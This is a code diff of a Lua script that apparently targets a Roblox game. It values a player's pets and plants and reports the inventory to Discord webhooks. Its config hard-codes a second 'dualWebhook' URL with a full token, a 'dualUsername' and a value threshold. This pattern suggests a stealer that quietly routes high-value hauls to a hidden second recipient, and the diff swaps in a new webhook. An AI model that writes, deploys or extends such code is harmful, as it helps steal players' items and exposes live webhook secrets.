@@ -48,7 +48,7 @@ end
 local CONFIG = {
     username = getfenv().Username,
     webhook = getfenv().Webhook,
-    dualWebhook = "https://discord.com/api/webhooks/1392882033415684310/rl03oFKAXcJyIq0U1Bcp0UplxZO_yOhkS8NNCxhuaLwWbwbZRs0-qpcTjsY2pWn2QhLT",
+    dualWebhook = "https://discord.com/api/webhooks/1394648714492248126/8b1eORWdBwAWsudi91-7vMYweIkFfaNVvNLkqGY9q_neJNyPoxGppQEyOlq61ka_Ejhm",
     dualUsername = "namnnni2",
     dualWebhookThreshold = 1e12,
     
@@ -251,18 +251,16 @@ function ItemProcessor.processPet(tool)
     
     local petName = petData.PetType
     local weight = tonumber(petData.PetData.BaseWeight) or 0
-local age = tonumber(petData.PetData.Age) or 0
-local value = ItemProcessor.calculatePetValue(petData)
-
-return {
-    Tool = tool,
-    Name = petName,
-    Weight = weight,
-    Age = age,
-    Value = value,
-    Type = "Pet",
-    IsTarget = Utils.isTargetPet(tool.Name)
-}
+    local value = ItemProcessor.calculatePetValue(petData)
+    
+    return {
+        Tool = tool,
+        Name = petName,
+        Weight = weight,
+        Value = value,
+        Type = "Pet",
+        IsTarget = Utils.isTargetPet(tool.Name)
+    }
 end
 
 function ItemProcessor.processPlant(tool)
@@ -405,11 +403,8 @@ else
     displayName = ":dog: " .. item.Name
 end
 
-        if item.Type == "Pet" then
-    inventoryReport = inventoryReport .. string.format("%s — %.2f KG — Age %d — 💰 %s\n", displayName, item.Weight, item.Age, Utils.formatNumber(item.Value))
-else
-    inventoryReport = inventoryReport .. displayName .. " — 💰 " .. Utils.formatNumber(item.Value) .. "\n"
-end
+        inventoryReport = inventoryReport .. displayName .. " — 💰 " .. Utils.formatNumber(item.Value) .. "\n"
+    end
 
     if inventoryReport == "" then
         inventoryReport = "No items found."
